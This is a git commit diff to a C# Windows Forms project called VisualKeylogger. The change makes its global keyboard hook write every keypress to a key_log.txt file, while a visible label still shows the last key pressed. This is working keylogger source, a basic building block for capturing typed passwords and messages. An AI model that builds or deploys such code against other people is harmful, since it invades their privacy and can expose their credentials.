5fd45a4283d48ec36b5cff0bea396a012e4dd514
Aussteja <bukauskyte.austeja@gmail.com>
2017-12-04 17:19:20 +0100

    writing keys to file

--- VisualKeylogger/Form1.cs
+++ VisualKeylogger/Form1.cs
@@ -14,6 +14,7 @@ namespace VisualKeylogger
     public partial class Form1 : Form
     {
         private IKeyboardMouseEvents m_GlobalHook;
+        private System.IO.StreamWriter m_File;
 
         public Form1()
         {
@@ -21,17 +22,23 @@ namespace VisualKeylogger
 
             m_GlobalHook = Hook.GlobalEvents();
             m_GlobalHook.KeyPress += GlobalHookKeyPress;
-        }
 
+            m_File = new System.IO.StreamWriter(AppDomain.CurrentDomain.BaseDirectory + "key_log.txt");
+        }
+        
         private void GlobalHookKeyPress(object sender, KeyPressEventArgs e)
         {
-            label1.Text = String.Format("Last key pressed: \t{0}", e.KeyChar);
+            label1.Text = String.Format("Last key pressed: {0}", e.KeyChar);
+            m_File.WriteLine(label1.Text);
+            m_File.Flush();
         }
 
         ~Form1()
         {
             m_GlobalHook.KeyPress -= GlobalHookKeyPress;
             m_GlobalHook.Dispose();
+
+            m_File.Close();
         }
     }
 }
